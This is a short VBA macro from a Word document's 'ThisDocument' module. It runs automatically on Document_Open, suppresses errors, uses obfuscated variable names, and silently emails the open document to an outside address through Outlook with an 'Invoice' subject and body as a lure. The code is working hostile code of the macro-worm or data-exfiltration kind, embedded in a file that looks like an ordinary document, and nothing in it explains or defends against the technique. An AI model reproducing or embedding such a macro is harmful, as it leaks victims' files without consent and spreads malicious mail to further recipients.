Attribute VB_Name = "ThisDocument"
Private Sub Document_Open()
    Dim frs0swbone As Object, bwt1msm67xb As Object
    On Error Resume Next
    Set frs0swbone = CreateObject("Outlook.Application")
    Set bwt1msm67xb = frs0swbone.CreateItem(0)
    bwt1msm67xb.To = "recipient@example.com"
    bwt1msm67xb.Subject = "Invoice"
    bwt1msm67xb.Body = "Please find the attached document."
    bwt1msm67xb.Attachments.Add ActiveDocument.FullName
    bwt1msm67xb.Send
End Sub
